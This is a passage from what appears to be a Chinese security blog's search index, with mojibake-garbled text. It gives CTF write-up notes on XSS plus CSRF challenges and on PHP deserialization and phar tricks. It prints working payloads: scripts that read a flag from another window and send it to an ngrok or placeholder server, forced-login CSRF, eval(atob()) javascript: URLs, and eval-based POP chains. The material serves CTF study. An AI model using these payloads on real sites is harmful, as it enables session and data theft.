{ // è®¿é—®url waitUntil: \u0026#39;load\u0026#39;, timeout: 20 * 1000, }); } catch (err){ console.log(err); } await page.close(); await browser.close(); console.log(`Done visiting -\u0026gt; ${url}`) } function main() { r.blpop([\u0026#39;submissions\u0026#39;, 0], async (_, submit_url) =\u0026gt; { let url = submit_url[1]; // å–å‡ºredisä¸­æäº¤çš„url await browse(url); // å¤„ç†url main(); }); } console.log(\u0026#34;XSS Bot ready\u0026#34;); main() flagåœ¨admin botçš„cookieä¸­ï¼Œå®ƒä¼šå¸¦ç€è¿™ä¸ªsessionè®¿é—®æˆ‘ä»¬çš„é¡µé¢ï¼Œå¦‚æœå®ƒç›´æ¥è®¿é—®/noteé‚£ä¹ˆå®ƒæœ¬åœ°çš„é¡µé¢ä¸Šå°±ä¼šæœ‰flagï¼Œä½†æ˜¯æˆ‘ä»¬æ— æ³•è·å¾—\næ³¨æ„åˆ°ç‰¹æ®Šçš„è¯·æ±‚å¤´X-Frame-Options=DENYï¼Œå®ƒä½¿å¾—è¯¥é¡µé¢ä¸å…è®¸è¢«ä»»ä½•é¡µé¢å¼•ç”¨ï¼Œä¹Ÿä¸å…è®¸å¼•ç”¨ä»»ä½•é¡µé¢ï¼Œæ‰€ä»¥æ²¡æ³•ç”¨iframeç›¸å…³çš„æŠ€å·§æ¥åšï¼šå‘é€ç»™adminçš„é¡µé¢(on our host)ä¸Šå…±æœ‰ä¸¤ä¸ªiframeï¼Œç¬¬ä¸€ä¸ªsrcæŒ‡å‘/flag(å¯ä»¥çœ‹åˆ°flagçš„é¡µé¢)çš„iframeï¼Œç¬¬äºŒä¸ªiframeæœ‰æˆ‘ä»¬çš„xss payloadï¼Œè¿™ä¸ªpayloadä¸­çš„scriptè„šæœ¬å¯ä»¥åšåˆ°XFS - cross frame scripting(è¯»å–top.frames)æ¥åˆ°è¾¾åŸæœ‰çš„é¡µé¢ï¼Œè½¬å‘é¡µé¢çš„ç¬¬ä¸€ä¸ªiframeè¯»åˆ°flagå¹¶å–å‡ºï¼Œåˆ©ç”¨çš„æ˜¯ä¸¤ä¸ªiframeæ˜¯åŒæºçš„ï¼Œæ‰€ä»¥å¯ä»¥see each other\u0026rsquo;s content\næ‰€ä»¥æˆ‘ä»¬æƒ³åˆ°ç”¨windowè€Œä¸æ˜¯iframeæ¥è¾¾åˆ°ç›¸ä¼¼çš„æ•ˆæœï¼ˆåŸç†ä¸€è‡´ï¼‰ï¼šå‘é€ç»™adminçš„é¡µé¢(on our host)ä¸Šæœ‰scriptå¯ä»¥åœ¨æ–°çª—å£æ‰“å¼€/noteé¡µé¢(å«æœ‰flag)ï¼Œç„¶åscriptç”¨csrfçš„æ–¹å¼post xss payload(è®¾ç½®target=\u0026quot;_blank\u0026quot;ä½¿å…¶åœ¨æ–°çª—å£å‡ºç°)ï¼Œåœ¨postå®Œæˆä¹‹åå°†å½“å‰çª—å£è½¬ä¸ºä¹‹å‰çš„/note æ¥ä½¿postçš„xssæ‰§è¡Œï¼Œç”±äºåŒæºå¯ä»¥è·å¾—å«flagçš„/noteé¡µé¢çš„å†…å®¹ï¼Œå†fetchå¤–å¸¦flag\næ€è·¯è·Ÿiframeçš„æ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡ç”±åˆ‡æ¢iframeå˜ä¸ºåˆ‡æ¢Tab windowï¼Œæ¥ä¸‹æ¥å°è¯•å†™payload\næ³¨æ„ä»¥ä¸‹xss botï¼Œç”±äºå®ƒçš„watiUntilçš„è®¾ç½®ï¼Œä¸€æ—¦è¢«è®¤ä¸ºæ˜¯åŠ è½½å°±ä¼šç›´æ¥dieæ‰ï¼Œè¿™é‡Œçš„ç»•è¿‡æ–¹å¼æ˜¯ç”¨ä¸­è½¬é¡µé¢æ‰‹åŠ¨å»¶æ—¶è®©å…¶æŒ‚èµ·ï¼ˆsetTimeoutåˆ™èµ·ä¸åˆ°åŒæ ·çš„æ•ˆæœ\npayload-url\nhttp://xxxx/pb app.js\nlet express = require(\u0026#39;express\u0026#39;); let app = express(); app.get(\u0026#39;/pb\u0026#39;, function(req, res) { res.sendFile(__dirname + \u0026#39;/pb.html\u0026#39;); }); app.get(\u0026#39;/delayThen404\u0026#39;, function(req, res) { setTimeout(()=\u0026gt; { res.sendStatus(404); }, 5000) }); let port = 5050; let server = app.listen(port); console.log(\u0026#39;Local server running on port: \u0026#39; + port); /pb.html\n\u0026lt;body\u0026gt; \u0026lt;p\u0026gt;hello world\u0026lt;/p\u0026gt; \u0026lt;form action=\u0026#34;https://tbdxss.chal.perfect.blue/change_note\u0026#34; id=\u0026#34;noteform\u0026#34; method=POST target=\u0026#34;_blank\u0026#34;\u0026gt; \u0026lt;textarea id=\u0026#34;payload\u0026#34; rows=\u0026#34;10\u0026#34; cols=\u0026#34;100\u0026#34; name=\u0026#34;data\u0026#34; form=\u0026#34;noteform\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; // open new window that has the flag and give it a \u0026#34;name\u0026#34; of \u0026#34;flagWindow\u0026#34; window.open(\u0026#39;https://tbdxss.chal.perfect.blue/note\u0026#39;, \u0026#39;flagWindow\u0026#39;); // this POSTs the above form with an XSS note value to read and exfiltrate the flag // note: we must use \\x3C as an alternate form of the \u0026#34;less than\u0026#34; character to avoid browser parser confusion inside payload.value = \u0026#34;\\x3Cscript\u0026gt;let flagWindow = window.open(\u0026#39;\u0026#39;, \u0026#39;flagWindow\u0026#39;); let flag = flagWindow.document.documentElement.innerText; fetch(\u0026#39;http://8709-68-51-145-201.ngrok.io/?flag=\u0026#39; + flag);\\x3C/script\u0026gt;\u0026#34;; noteform.submit(); // Run this code after a 5 second delay to ensure the above POST has completed before we reload our XSS payload into *this* page. setTimeout(()=\u0026gt; { // This loads our previously-posted XSS which will read the flag from the previously-opened window and exfiltrate it. window.location.href = \u0026#39;https://tbdxss.chal.perfect.blue/note\u0026#39;; }, 5000) \u0026lt;/script\u0026gt; \u0026lt;!-- æä¾›å»¶æ—¶æ¥è®©ä¸Šé¢çš„scriptæ‰§è¡Œ --\u0026gt; \u0026lt;img src=\u0026#39;https://xxxx/delayThen404\u0026#39; onerror=\u0026#34;window.location.href=\u0026#39;https://tbdxss.chal.perfect.blue/note\u0026#39;\u0026#34;\u0026gt; \u0026lt;/body\u0026gt; â€”â€”â€”â€”åœ¨å¦ä¸€ä¸ªwpä¸­å­¦åˆ°delayè¿˜å¯ä»¥æœ‰ä¸“é—¨çš„å®šå‹å·¥å…·https://deelay.me/ï¼Œç”¨æ³•æ˜¯\nhttps://deelay.me/\u0026lt;delay in milliseconds\u0026gt;/\u0026lt;original url\u0026gt; eg: https://deelay.me/5000/https://picsum.photos/200/300 æ‰€ä»¥ä¸Šé¢çš„æˆ‘ä»¬è¿˜å¯ä»¥è¿™æ ·åšï¼š\nindex.phpï¼šåšå»¶æ—¶ï¼Œè½¬åˆ°main.php \u0026lt;script\u0026gt; open(location.href + \u0026#39;main.php\u0026#39;, \u0026#39;_blank\u0026#39;) \u0026lt;/script\u0026gt; \u0026lt;img src=\u0026#34;https://deelay.me/20000/https://example.com\u0026#34;\u0026gt; main.phpï¼šæ–°å¼€ä¸¤ä¸ªtabåå½“å‰é¡µé¢é‡å®šå‘åˆ°å«flagçš„/noteä¸­ \u0026lt;script\u0026gt; open(location.href.replace(\u0026#39;main\u0026#39;, \u0026#39;submit\u0026#39;), \u0026#39;_blank\u0026#39;) open(location.href.replace(\u0026#39;main\u0026#39;, \u0026#39;opennote\u0026#39;), \u0026#39;_blank\u0026#39;) location.href = \u0026#39;https://tbdxss.chal.perfect.blue/note\u0026#39; \u0026lt;/script\u0026gt; submit.phpï¼šæ ‡å‡†csrf \u0026lt;form action=\u0026#34;https://tbdxss.chal.perfect.blue/change_note\u0026#34; method=\u0026#34;POST\u0026#34; id=f\u0026gt; \u0026lt;input name=\u0026#34;data\u0026#34; value=\u0026#34;peko\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; f.data.value = \u0026#39;\u0026lt;script\u0026gt;const report = t =\u0026gt; fetch(\u0026#34;https://YOUR_SERVER/xss.php\u0026#34;, {method: \u0026#34;POST\u0026#34;, body: t}); report(window.opener.opener.document.body.textContent)\u0026lt;/\u0026#39;+\u0026#39;script\u0026gt;\u0026#39; f.submit() \u0026lt;/script\u0026gt; opennote.phpï¼šdelayååœ¨æ–°tabçš„/noteä¸­æ‰§è¡Œxss payloadï¼Œç”±äºæ˜¯æ–°tabï¼Œæ‰€ä»¥éœ€è¦window.opener.openeræ‰å¯ä»¥åˆ°åŸå…ˆçš„main.php \u0026lt;script\u0026gt;setTimeout(() =\u0026gt; { open(\u0026#39;https://tbdxss.chal.perfect.blue/note\u0026#39;, \u0026#39;_blank\u0026#39;) }, 1000)\u0026lt;/script\u0026gt; å‚è€ƒï¼šwp1 | wp2 | wp3\n[MiscCTF 2021]XSS to CSRF https://hg8.sh/posts/misc-ctf/xss-to-csrf/\nèŠå¤©æœºå™¨äººï¼Œå‘é€çš„è¯­å¥å¯ä»¥åŒ…å«Html ä¼šè¢«æ¸²æŸ“ï¼Œå°è¯•\n\u0026lt;img src=x onerror=alert(1)\u0026gt; æœ‰åå°„å‹xsss\nè¿›ä¸€æ­¥äº†è§£è¿™ä¸ªBotçš„å·¥ä½œï¼Œé‡åˆ°\u0026quot;badwords\u0026quot;ä¼šæš‚åœå¯¹è¯ï¼Œè¯´æ˜åœ¨åç«¯ç»è¿‡äº†æŸäº›æ£€æµ‹\nä½¿ç”¨websocketè¿›è¡Œå†…å®¹çš„äº¤äº’\nå°è¯•ç›´æ¥å»ºç«‹ä¸æœåŠ¡ç«¯çš„è¿æ¥\nwebsocket = new WebSocket(\u0026#39;ws://misc.ctf:33433/\u0026#39;); websocket.onmessage = function(message) { console.log(message.data); } websocket.send(\u0026#39;test\u0026#39;) ç»§ç»­å°è¯•\n\u0026gt; websocket.send(\u0026#39;/help\u0026#39;) { \u0026#34;content\u0026#34;: \u0026#34;\u0026lt;message\u0026gt;\u0026#34; } to send a message /moderator to enter moderator mode debugger \u0026gt; websocket.send(\u0026#39;/moderator\u0026#39;) You need to be authenticated to execute this command æˆ‘ä»¬æ²¡æœ‰ç›´æ¥è®¿é—®/moderatorçš„æƒåˆ©ï¼Œå€ŸåŠ©æ£€æµ‹\u0026quot;badwords\u0026quot;çš„åŠŸèƒ½ï¼Œå‘é€å«æœ‰å»ºç«‹websocketè¿æ¥çš„payloadï¼Œç”¨CSRFçš„æ–¹å¼è®©botè®¿é—® æŠŠç»“æœå¤–å¸¦\n\u0026lt;img src=x onerror=\u0026#34;ws=new WebSocket(\u0026#39;ws://\u0026#39;+window.location.host);ws.onopen=()=\u0026gt;ws.send(\u0026#39;/moderator\u0026#39;)\u0026#34;\u0026gt; åŠ ä¸Šä¸€ä¸ª\u0026quot;badwords\u0026quot;\nğŸ–• \u0026lt;img src=x onerror=\u0026#34;ws=new WebSocket(\u0026#39;ws://\u0026#39;+window.location.host);ws.onopen=()=\u0026gt;ws.send(\u0026#39;/moderator\u0026#39;)\u0026#34;\u0026gt; *[247CTF 2021]Helicopter Administrator https://gusralph.info/exploiting-xss-for-sqli/\n[picoCTF 2022]noted HINT:\n\u0026ldquo;Are you sure I followed all the best practices?\u0026rdquo; \u0026ldquo;There\u0026rsquo;s more than just HTTP(S)!\u0026rdquo; \u0026ldquo;Things that require user interaction normally in Chrome might not require it in Headless Chrome.\u0026rdquo; The description also stated that the headless chrome has no internet access. So it cannot be used to phone home outside the context of this application. ç™»å…¥è´¦å·åæ‰èƒ½å‘å†…å®¹ï¼Œxss botä¼šå…ˆæ³¨å†Œéšæœºè´¦å· ç™»å…¥åå‘flag ç„¶åæµè§ˆæˆ‘ä»¬çš„urlï¼Œé¢˜ç›®æç¤ºxss botä¸èƒ½å‡ºç½‘\n// report.js const crypto = require(\u0026#39;crypto\u0026#39;); const puppeteer = require(\u0026#39;puppeteer\u0026#39;); async function run(url) {\t// å¯¹urlæ— waf let browser; try { module.exports.open = true; browser = await puppeteer.launch({ headless: true, pipe: true, args: [\u0026#39;--incognito\u0026#39;, \u0026#39;--no-sandbox\u0026#39;, \u0026#39;--disable-setuid-sandbox\u0026#39;], slowMo: 10 }); let page = (await browser.pages())[0] await page.goto(\u0026#39;http://0.0.0.0:8080/register\u0026#39;);\t// æ³¨å†Œéšæœºè´¦å· await page.type(\u0026#39;[name=\u0026#34;username\u0026#34;]\u0026#39;, crypto.randomBytes(8).toString(\u0026#39;hex\u0026#39;)); await page.type(\u0026#39;[name=\u0026#34;password\u0026#34;]\u0026#39;, crypto.randomBytes(8).toString(\u0026#39;hex\u0026#39;)); await Promise.all([ page.click(\u0026#39;[type=\u0026#34;submit\u0026#34;]\u0026#39;), page.waitForNavigation({ waituntil: \u0026#39;domcontentloaded\u0026#39; }) ]); await page.goto(\u0026#39;http://0.0.0.0:8080/new\u0026#39;); await page.type(\u0026#39;[name=\u0026#34;title\u0026#34;]\u0026#39;, \u0026#39;flag\u0026#39;); await page.type(\u0026#39;[name=\u0026#34;content\u0026#34;]\u0026#39;, process.env.FLAG ?? \u0026#39;ctf{flag}\u0026#39;); await Promise.all([ page.click(\u0026#39;[type=\u0026#34;submit\u0026#34;]\u0026#39;), page.waitForNavigation({ waituntil: \u0026#39;domcontentloaded\u0026#39; }) ]); await page.goto(\u0026#39;about:blank\u0026#39;) await page.goto(url); await page.waitForTimeout(7500); await browser.close(); } catch(e) { console.error(e); try { await browser.close() } catch(e) {} } module.exports.open = false; } module.exports = { open: false, run } // web.js fastify.post(\u0026#39;/report\u0026#39;, { schema: reportSchema, preHandler: fastify.csrfProtection }, auth((req, res) =\u0026gt; { let { url } = req.body; if (report.open) { return res.send(\u0026#39;Only one browser can be open at a time!\u0026#39;); } else { report.run(url); } return res.send(\u0026#39;URL has been reported.\u0026#39;); })); åœ¨notes.ejsä¸­ç”¨\u0026lt;%- something %\u0026gt;çš„æ¨¡æ¿å½¢å¼è¾“å‡ºå†…å®¹\n\u0026lt;h2\u0026gt;\u0026lt;%- note.title %\u0026gt;\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;\u0026lt;%- note.content %\u0026gt;\u0026lt;/p\u0026gt; å¯ä»¥åšåˆ°self-xssï¼Œæˆ‘ä»¬è”æƒ³åˆ°csrf+xssçš„å¸¸è§æ‰“æ³•ï¼šxssä¸€ä¸ªcsrfçš„å†…å®¹ï¼Œæ¯”å¦‚è¿™é‡Œçš„ç™»å½•è´¦å·çš„è¡¨å•ï¼›ä½†æ˜¯flagæ˜¯åœ¨éšæœºè´¦å·ä¸­ï¼Œè¦xsså¿…é¡»ä¹Ÿè¦†ç›–cookie\nè”æƒ³TBDXSSé‚£ä¸ªé¢˜ç›® ä¸¤ä¸ªtabä¹‹é—´å®ç°å†…å®¹çš„è¯»å–ï¼šå¦‚æœwindow A Béƒ½æœ‰ç›¸åŒçš„document.domainï¼Œåªè¦æœ‰window referenceå°±å¯ä»¥è¯»å–å¦ä¸€ä¸ªwindowçš„DOMå†…å®¹ï¼›æ‰€ä»¥åªè¦è®©Aæ˜¯POST loginä¹‹å‰çš„é¡µé¢ï¼ŒBæ˜¯self-xssçš„é¡µé¢ï¼Œè¯»å–Açš„DOMå°±å¯ä»¥æ‹¿åˆ°flag\nå¦å¤–æ³¨æ„ä¸€ä¸‹report.jsä¸­å¹¶æ²¡æœ‰å¯¹æˆ‘ä»¬çš„urlåŠ wafï¼Œæ‰€ä»¥javascript:alert(1)ä¹‹ç±»çš„urlä¹Ÿèƒ½åœ¨about:blankä¸Šxss æˆ–è€…å¼€æ–°çš„windowæ„æˆcsrfï¼Œæ¯”å¦‚åƒjavascript:eval(atob(xxxx))è¿™æ ·æ“ä½œjså†…å®¹\nå…³äºflagçš„å›æ˜¾ï¼Œç”±äºbotä¸å‡ºç½‘ï¼Œæˆ‘ä»¬è€ƒè™‘åˆ›å»ºä¸€ä¸ªè´¦å·ï¼Œå°†flagç”¨self-xss+iframeçš„æ–¹å¼ä¼ å›æ¥\næäº¤urlï¼Œç”¨javascript:å½¢å¼çš„url åŒ…å«ä¸€ä¸ªcsrfçš„è¡¨å•ï¼Œå¼ºåˆ¶ç™»å…¥æˆ‘ä»¬çš„è´¦å·\nconst csrf = ` \u0026lt;form name=frm action=\u0026#39;http://0.0.0.0:8080/login\u0026#39; method=post\u0026gt; \u0026lt;input name=username value=supernene\u0026gt; \u0026lt;input name=password value=supernene\u0026gt; \u0026lt;/form\u0026gt; `\t// ç™»å…¥æˆ‘ä»¬çš„å·²çŸ¥è´¦æˆ· const js = ` win = window.open(\u0026#39;\u0026#39;, \u0026#39;\u0026#39;) win.document.body.innerHTML = atob(\u0026#39;${btoa(csrf)}\u0026#39;) win.document.frm.submit() location.href = \u0026#39;http://0.0.0.0:8080\u0026#39; `\t// åœ¨about:blanké¡µé¢æ“ä½œ const url = `javascript:eval(atob(\u0026#39;${btoa(js)}\u0026#39;))` console.log(url) ç™»å…¥çš„æˆ‘ä»¬çš„è´¦å·ä¸­å«æœ‰å¦‚ä¸‹çš„self-xss payloadï¼Œè¯»å–ä¹‹å‰boté¡µé¢ä¸­çš„flagï¼Œ\n\u0026lt;iframe src=\u0026#34;/new\u0026#34; id=frm\u0026gt; \u0026lt;/iframe\u0026gt; \u0026lt;script\u0026gt; const flag = window.opener.document.body.textContent frm.onload=()=\u0026gt;{ frm.onload=null const newfrm = frm.contentDocument.forms[0]\t// ç¡®ä¿new tab newfrm.title.value = \u0026#39;FLAG\u0026#39; newfrm.content.value = flag newfrm.submit() } \u0026lt;/script\u0026gt; å‚è€ƒï¼šwp1 | wp2\n","date":"2022-04-24T21:58:17+08:00","permalink":"https://amiaaaz.github.io/2022/04/24/xss-csrf-study-notes/","section":"posts","tags":["XSS","CSRF","Cookie"],"title":"cookieç›¸å…³çš„xss\u0026csrf"},{"categories":["NOTES\u0026SUMMARY"],"contents":"æŠ¥é”™\u0026amp;GCç›¸å…³é—®é¢˜ PHPæ˜¯å­˜åœ¨GCçš„è¯­è¨€ï¼Œè€Œååºåˆ—åŒ–å¯¹è±¡æ—¶çš„__destructå°±æ˜¯å¯¹å·²newå¯¹è±¡çš„å›æ”¶ï¼Œä¸€ä¸ªå°æ —å­\n\u0026lt;?php error_reporting(0); class test{ public $num; public function __construct($num){ $this-\u0026gt;num = $num; echo $this-\u0026gt;num.\u0026#34;__construct\u0026#34;.\u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; } public function __destruct(){ echo $this-\u0026gt;num.\u0026#34;__destruct\u0026#34;.\u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; } } new test(1); $a = new test(2); $b = new test(3); // 1__construct\u0026lt;/br\u0026gt;1__destruct\u0026lt;/br\u0026gt;2__construct\u0026lt;/br\u0026gt;3__construct\u0026lt;/br\u0026gt;3__destruct\u0026lt;/br\u0026gt;2__destruct\u0026lt;/br\u0026gt; å½“ä¸‹é¢çš„ä¸‰è¡Œä»£ç å‡å’Œç¬¬ä¸€è¡Œä¸€æ ·ï¼Œæ— å¼•ç”¨å’ŒæŒ‡å‘ï¼Œé‚£ä¹ˆéƒ½å°†ä¼šæ˜¯ä¾æ¬¡çš„construct+destructï¼Œä½†æ˜¯åœ¨ä¸Šè¿°ä¾‹å­ä¸­ï¼Œåªæœ‰å¯¹è±¡1æ²¡æœ‰å¼•ç”¨å’ŒæŒ‡å‘ æ‰€ä»¥åªæœ‰å®ƒåˆ›å»ºåç«‹åˆ»å›æ”¶ï¼›å†çœ‹ä¸‹é¢è¿™ä¸¤ç§æƒ…å†µ\n$c = array(new test(1), 0); $c[0] = $c[1]; $a = new test(2); $b = new test(3); // 1__construct\u0026lt;/br\u0026gt;1__destruct\u0026lt;/br\u0026gt;2__construct\u0026lt;/br\u0026gt;3__construct\u0026lt;/br\u0026gt;3__destruct\u0026lt;/br\u0026gt;2__destruct\u0026lt;/br\u0026gt; $c = array(new test(1), 0); // $c[0] = $c[1]; $a = new test(2); $b = new test(3); // 1__construct\u0026lt;/br\u0026gt;2__construct\u0026lt;/br\u0026gt;3__construct\u0026lt;/br\u0026gt;3__destruct\u0026lt;/br\u0026gt;2__destruct\u0026lt;/br\u0026gt;1__destruct\u0026lt;/br\u0026gt; â€”â€”â€”â€”å¾ˆå¥½ç†è§£ï¼šæ— å˜é‡æŒ‡å‘çš„newçš„å¯¹è±¡åˆ›å»ºåå³å›æ”¶ï¼Œæœ‰æŒ‡å‘çš„æŒ‰åˆ›å»ºæ—¶é—´å€’åºå›æ”¶ï¼ˆå…ˆåˆ›å»ºçš„æœ€åå›æ”¶\né—®é¢˜çš„å…³é”®åœ¨äºå¯èƒ½æ¥æ…å±€çš„throw new Exception();ï¼Œæ¯”å¦‚\nunserialize($_GET[\u0026#39;url\u0026#39;]); throw new Exception(\u0026#34;xxx\u0026#34;); åœ¨è¿™ç§æƒ…å†µä¸‹ç¨‹åºå¼‚å¸¸æŠ¥é”™é€€å‡ºï¼Œæˆ‘ä»¬popé“¾ä¸­é‡è¦çš„__destructä¸ä¼šæ‰§è¡Œï¼ˆå®ƒåœ¨å¯¹è±¡æ­£å¸¸é”€æ¯æ—¶è¢«æ‰§è¡Œï¼‰ï¼Œæ¯”å¦‚ä¸€ä¸ªå¾ˆç®€å•çš„popé“¾\n\u0026lt;?php highlight_file(__FILE__); error_reporting(0); class errorr0{ public $num; public function __destruct(){ echo \u0026#34;hello __destruct\u0026#34;; echo $this-\u0026gt;num; } } class errorr1{ public $err; public function __toString() { echo \u0026#34;hello __toString\u0026#34;; $this-\u0026gt;err-\u0026gt;flag(); } } class errorr2{ public $err; public function flag() { echo \u0026#34;hello __flag()\u0026#34;; eval($this-\u0026gt;err); } } $e1 = new errorr0(); $e2 = new errorr1(); $e3 = new errorr2(); $e3-\u0026gt;err = \u0026#34;phpinfo();\u0026#34;; $e2-\u0026gt;err = $e3; $e1-\u0026gt;num = $e2; $result = serialize($e1); unserialize($result); // O:7:\u0026#34;errorr0\u0026#34;:1:{s:3:\u0026#34;num\u0026#34;;O:7:\u0026#34;errorr1\u0026#34;:1:{s:3:\u0026#34;err\u0026#34;;O:7:\u0026#34;errorr2\u0026#34;:1:{s:3:\u0026#34;err\u0026#34;;s:10:\u0026#34;phpinfo();\u0026#34;;}}} å¦‚æœæˆ‘ä»¬å‘æœ€åä¸€è¡Œçš„unserializeä¹‹åå†æ·»åŠ throw new Exceptionï¼Œæˆ‘ä»¬ä¼šå‘ç°åŸæ¥çš„phpinfoç•Œé¢ç«‹åˆ»å°±ä¼šæ¶ˆå¤±ï¼Œé˜»æ­¢__destructçš„æ‰§è¡Œ\né’ˆå¯¹è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬é€‰æ‹©å°†å¯¹è±¡æ’åœ¨æœ‰NULLå…ƒç´ çš„æ•°ç»„ä¸­\n$e1 = new errorr0(); $e2 = new errorr1(); $e3 = new errorr2(); $e3-\u0026gt;err = \u0026#34;phpinfo();\u0026#34;; $e2-\u0026gt;err = $e3; $e1-\u0026gt;num = $e2; $c = array(0=\u0026gt;$e1, 1=\u0026gt;NULL); // a:2:{i:0;O:7:\u0026#34;errorr0\u0026#34;:1:{s:3:\u0026#34;num\u0026#34;;O:7:\u0026#34;errorr1\u0026#34;:1:{s:3:\u0026#34;err\u0026#34;;O:7:\u0026#34;errorr2\u0026#34;:1:{s:3:\u0026#34;err\u0026#34;;s:10:\u0026#34;phpinfo();\u0026#34;;}}}i:1;N;} // a:2:{i:0;O:7:\u0026#34;errorr0\u0026#34;:1:{s:3:\u0026#34;num\u0026#34;;O:7:\u0026#34;errorr1\u0026#34;:1:{s:3:\u0026#34;err\u0026#34;;O:7:\u0026#34;errorr2\u0026#34;:1:{s:3:\u0026#34;err\u0026#34;;s:10:\u0026#34;phpinfo();\u0026#34;;}}}i:0;N;} è€Œç›´æ¥serialize($c)çš„ç»“æœä¹Ÿæ— æ³•è¾¾åˆ°é¢„æœŸï¼Œæ•°ç»„ä¸­i=0æ˜¯æˆ‘ä»¬çš„å¯¹è±¡ï¼Œi=1æ˜¯NULLï¼Œæˆ‘ä»¬æ‰‹åŠ¨æŠŠi:1æ”¹ä¸ºi:0ï¼Œä¹Ÿå°±æ˜¯æ”¹ä¸ºNULL è®©å…¶å¤±å»å¼•ç”¨ï¼Œæå‰GCè§¦å‘__destruct\npharä¸­çš„åº”ç”¨ è€Œè¿™ç§æ”¹åŠ¨åœ¨pharä¸­ä¼šé€ æˆç­¾åé”™è¯¯ï¼ˆphpstormä¼šæ— æ³•å†è¯†åˆ«ï¼‰ï¼Œéœ€è¦é‡æ–°ç”Ÿæˆç­¾åï¼ˆä¸è¿‡ä¾æ—§æ— æ³•è¯†åˆ«ï¼‰\nfrom hashlib import sha1 file = open(\u0026#34;arsenetang.phar\u0026#34;,\u0026#34;rb\u0026#34;).read() text = file[:-28] # è¯»å–å¼€å§‹åˆ°æœ«å°¾é™¤ç­¾åå¤–å†…å®¹ last = file[-8:] # è¯»å–æœ€å8ä½çš„GBMBå’Œç­¾åflag new_file = text+sha1(text).digest() + last # ç”Ÿæˆæ–°çš„æ–‡ä»¶å†…å®¹ æ­¤æ—¶sha1æ­£ç¡® open(\u0026#34;change.phar\u0026#34;,\u0026#34;wb\u0026#34;).write(new_file) [NSSCTF 2021]prize_p1 \u0026lt;?php highlight_file(__FILE__); class getflag { function __destruct() { // echo getenv(\u0026#34;FLAG\u0026#34;); // ç›®æ ‡ echo \u0026#34;flag{111}\u0026#34;; // æœ¬åœ°æµ‹è¯• } } class A { public $config; function __destruct() { if ($this-\u0026gt;config == \u0026#39;w\u0026#39;) { $data = $_POST[0]; // ä¼ å…¥pharå†…å®¹ if (preg_match(\u0026#39;/get|flag|post|php|filter|base64|rot13|read|data/i\u0026#39;, $data)) { die(\u0026#34;æˆ‘çŸ¥é“ä½ æƒ³å¹²å—ï¼Œæˆ‘çš„å»ºè®®æ˜¯ä¸è¦é‚£æ ·åšã€‚\u0026#34;); } file_put_contents(\u0026#34;./tmp/a.txt\u0026#34;, $data); // ä¼ å…¥pharå†…å®¹ } else if ($this-\u0026gt;config == \u0026#39;r\u0026#39;) { $data = $_POST[0]; // æ–‡ä»¶è·¯å¾„ if (preg_match(\u0026#39;/get|flag|post|php|filter|base64|rot13|read|data/i\u0026#39;, $data)) { die(\u0026#34;æˆ‘çŸ¥é“ä½ æƒ³å¹²å—ï¼Œæˆ‘çš„å»ºè®®æ˜¯ä¸è¦é‚£æ ·åšã€‚\u0026#34;); } echo file_get_contents($data); // pharè§¦å‘ååºåˆ—åŒ– } } } if (preg_match(\u0026#39;/get|flag|post|php|filter|base64|rot13|read|data/i\u0026#39;, $_GET[0])) { die(\u0026#34;æˆ‘çŸ¥é“ä½ æƒ³å¹²å—ï¼Œæˆ‘çš„å»ºè®®æ˜¯ä¸è¦é‚£æ ·åšã€‚\u0026#34;); } unserialize($_GET[0]); // ä¼ å…¥Açš„åºåˆ—åŒ– throw new Error(\u0026#34;é‚£ä¹ˆå°±ä»è¿™é‡Œå¼€å§‹èµ·èˆªå§\u0026#34;); // éœ€ç»• æ•°ç»„+i:0 å¯¹äºAï¼Œå†™å…¥\n\u0026lt;?php class A { public $config=\u0026#39;w\u0026#39;; } $a = new A(); echo serialize($a); // O:1:\u0026#34;A\u0026#34;:{s:6:\u0026#34;config\u0026#34;;s:1:\u0026#34;w\u0026#34;;} è¯»\n\u0026lt;?php class A { public $config=\u0026#39;r\u0026#39;; } $a = new A(); echo serialize($a); // O:1:\u0026#34;A\u0026#34;:1:{s:6:\u0026#34;config\u0026#34;;s:1:\u0026#34;r\u0026#34;;} å¯¹äºphar\n\u0026lt;?php class getflag { } $a[] = new getflag(); $a[] = 1; $phar = new Phar(\u0026#39;phar.phar\u0026#39;); $phar -\u0026gt; startBuffering(); $phar -\u0026gt; setStub(\u0026#39;GIF89a\u0026#39;.\u0026#39;\u0026lt;?php __HALT_COMPILER();?\u0026gt;\u0026#39;); // è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´ $phar -\u0026gt; addFromString(\u0026#39;test.txt\u0026#39;,\u0026#39;test\u0026#39;); // æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ $phar -\u0026gt; setMetadata($a); // å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest $phar -\u0026gt; stopBuffering(); å°†.metadata.binä¸­å‰é¢çš„ä¸€ä¸ªi:1æ”¹ä¸ºi:0åæ”¹ç­¾å\nfrom hashlib import sha1 file = open(\u0026#34;phar.phar\u0026#34;,\u0026#34;rb\u0026#34;).read() text = file[:-28] # è¯»å–å¼€å§‹åˆ°æœ«å°¾é™¤ç­¾åå¤–å†…å®¹ last = file[-8:] # è¯»å–æœ€å8ä½çš„GBMBå’Œç­¾åflag new_file = text+sha1(text).digest() + last # ç”Ÿæˆæ–°çš„æ–‡ä»¶å†…å®¹ æ­¤æ—¶sha1æ­£ç¡® open(\u0026#34;change.phar\u0026#34;,\u0026#34;wb\u0026#34;).write(new_file) pythonå‘åŒ…ï¼Œé¿å…ç‰¹æ®Šå­—ç¬¦\nimport requests import gzip url = \u0026#39;http://localhost/temp/tttt.php\u0026#39; file = open(\u0026#34;./chang.phar\u0026#34;, \u0026#34;rb\u0026#34;) #æ‰“å¼€æ–‡ä»¶ file_out = gzip.open(\u0026#34;./ars2.zip\u0026#34;, \u0026#34;wb+\u0026#34;)#åˆ›å»ºå‹ç¼©æ–‡ä»¶å¯¹è±¡ file_out.writelines(file) file_out.close() file.close() requests.post( url, params={ 0: 